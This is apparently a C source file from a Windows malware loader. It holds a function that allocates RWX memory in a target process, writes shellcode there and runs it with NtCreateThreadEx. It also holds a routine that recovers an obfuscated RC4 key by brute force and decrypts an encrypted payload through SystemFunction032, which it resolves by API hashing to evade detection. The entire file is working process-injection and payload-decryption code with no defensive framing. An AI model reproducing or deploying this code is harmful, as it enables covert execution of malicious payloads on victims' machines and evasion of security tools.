#include <Windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"



BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {

    PVOID pAddress      = NULL,
        pExecuteAddress = NULL;

    NTSTATUS STATUS = 0;
    HANDLE hThread = NULL;
    SIZE_T sBytesWritten = 0;

    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };



    PRINTA("allocating buffer in process memory...\n");
    STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions! At : 0x%p\n", pAddress);



    PRINTA("writing payload to allocated buffer...\n");
    STATUS = NtWriteVirtualMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &sBytesWritten);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("wrote %zu-bytes to allocated buffer!\n", sBytesWritten);

    


    PRINTA("creating thread, beginning execution\n");
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtCreateThreadEx] failed to create thread, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("thread created!\n");


    PRINTA("waiting for thread to finish executing...\n");
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtWaitForSingleObject] failed to wait for thread to finsih, error: 0x%x\n", STATUS);
        goto CLEANUP;
    }
    PRINTA("thread execute succesfully!\n");

    goto CLEANUP;

CLEANUP:
    PRINTA("clean up, closing thread handle...\n");
    STATUS = NtClose(hThread);
    if (!STATUS == STATUS_SUCCESS) {
        PRINTA("[NtClose] Unable to close thread handle, error: 0x%x\n", STATUS);
        return EXIT_FAILURE;
    }
    PRINTA("thread handle closed!\n");

    PRINTA("cleanup complete! have fun!\n");
    return TRUE;
}



BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // The return of SystemFunction032
    NTSTATUS        	STATUS = NULL;
    BYTE			RealKey[KEY_SIZE] = { 0 };
    int			    b = 0;

    // Brute forcing the key:
    while (1) {
        // Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key 
        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
            break;
        // Else, increment 'b' and try again
        else
            b++;
    }

    PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);

    // Decrypting the key
    for (int i = 0; i < KEY_SIZE; i++) {
        RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
    }

    // Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // And using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA("Cryptsp"), SystemFunction032_DJB2);

    // If SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}